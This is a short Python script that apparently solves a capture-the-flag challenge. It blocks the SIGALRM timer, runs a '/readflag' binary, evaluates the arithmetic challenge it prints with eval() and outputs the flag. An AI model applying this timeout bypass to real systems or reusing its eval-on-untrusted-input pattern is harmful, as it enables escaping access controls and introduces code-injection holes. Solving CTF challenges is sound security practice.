import signal
import subprocess
import sys
import re
import os
import time

def log(msg):
    sys.stderr.write(f"[EXPLOIT] {msg}\n")
    sys.stderr.flush()

def main():
    log("Python Solver Started!")
    log(f"UID: {os.getuid()} GID: {os.getgid()}")
    
    # Block SIGALRM
    try:
        signal.pthread_sigmask(signal.SIG_BLOCK, [signal.SIGALRM])
        log("Blocked SIGALRM")
    except AttributeError:
        log("signal.pthread_sigmask not available")
    except Exception as e:
        log(f"Error blocking signal: {e}")

    try:
        log("Invoking /readflag")
        # Run unbuffered
        p = subprocess.Popen(
            ["/readflag"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=0
        )
        
        buffer = ""
        while True:
            char = p.stdout.read(1)
            if not char: break
            buffer += char
            if "input your answer:" in buffer:
                break
        
        log(f"Got Prompt: {buffer.strip()}")
        
        # Extract math
        match = re.search(r'(\( {2,}.*?\))', buffer, re.DOTALL)
        if match:
            expr = match.group(1)
            log(f"Math: {expr}")
            ans = eval(expr)
            log(f"Answer: {ans}")
            
            p.stdin.write(f"{ans}\n")
            p.stdin.flush()
            
            res = p.stdout.read()
            log(f"FINAL OUTPUT: {res}")
            print(f"\n\nFLAG_FOUND: {res}\n\n", flush=True)
        else:
            log("No math found")

    except Exception as e:
        log(f"Exception: {e}")

if __name__ == "__main__":
    main()
